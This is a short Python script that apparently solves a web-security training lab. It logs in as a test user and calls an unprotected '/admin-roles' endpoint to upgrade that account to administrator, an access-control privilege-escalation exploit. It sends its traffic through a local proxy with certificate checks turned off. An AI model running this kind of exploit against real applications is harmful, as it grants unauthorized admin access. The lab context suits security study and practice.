import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080'
}


def delete_user(url,s):
    print("(+) Trying to login to wiener first...")
    login_url = url + '/login'
    data = {
        'username': 'wiener',
        'password': 'peter'
    }
    req = s.post(login_url,data=data,proxies=proxies,verify=False)
    res = req.text
    if "Log out" in res:
        print("(+) Successfully logged in with wiener")
        print("(+) Trying to get admin privilates...")
        admin_url = url + '/admin-roles?username=wiener&action=upgrade'
        req = s.get(admin_url,proxies = proxies,verify= False)
        if req.status_code==200:
            print("(+) Successfully got admin privilage in this user ")
            print("(+) Lab Solved!")
        else:
            print("(+) Can't escalate privilage!")
    else:
        print("(+) Can't login into wiener username!")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0].split('/')[-1]} URL")
        print(f"Example: {sys.argv[0].split('/')[-1]} www.example.com")
        sys.exit(-1)
    
    print("(+) Finding admin panel...")
    url = sys.argv[1]
    s = requests.Session()
    delete_user(url, s)



if __name__ == '__main__':
    main()